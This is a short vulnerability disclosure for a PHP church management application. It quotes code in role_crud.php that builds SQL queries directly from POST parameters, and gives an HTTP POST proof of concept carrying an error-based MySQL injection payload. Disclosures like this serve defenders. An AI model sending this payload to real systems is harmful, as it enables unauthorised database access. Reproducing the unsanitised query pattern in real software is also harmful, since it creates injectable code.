### Vulnerability file address

`church/admin/app/role_crud.php` from line 40,The `$_POST["checkItem"];` parameter is controllable and the `$_POST['checkItem']` is not protected from sql injection, line 45 `$sql="insert into permission_role(permission_id,group_id)values('$checkItem[$i]','$id')";` ,line 46 `$execute = $conn->query($sql);` performs a SQL query, causing SQL injection

```php
if (isset($_POST['update'])) {
      
      
     extract($_POST);
     $stmt = $conn->prepare("delete  from permission_role where group_id='".$_POST['id']."'");
    $stmt->execute();
    $stmt = $conn->prepare("UPDATE groups set name='$name',description='$description' where id='".$_POST['id']."'");
    $stmt->execute();

$checkItem = $_POST["checkItem"];
//print_r($_POST);
 $a = count($checkItem);  
for($i=0;$i<$a;$i++){
 $id = $_POST['id'];
         $sql="insert into permission_role(permission_id,group_id)values('$checkItem[$i]','$id')";
          $execute = $conn->query($sql);
        
       }
    
        $_SESSION['update'] = "update";
        header("location:../manage_role.php");
    }
```

### POC

```http
POST /church/admin/app/role_crud.php HTTP/1.1
Host: www.church.net
Connection: close
Cookie: PHPSESSID=hl5noegsdjn1ru7skoi8tmqco3
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 64

update=1&checkItem[]='||(SELECT 0x694e7272 WHERE 9570=9570 AND GTID_SUBSET(CONCAT(0x7162717171,(SELECT (ELT(2639=2639,1))),0x7178767671),2639))||'&name=123&description=123&id=123
```

### Attack results pictures

![image-20250505210947409](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505052109446.png)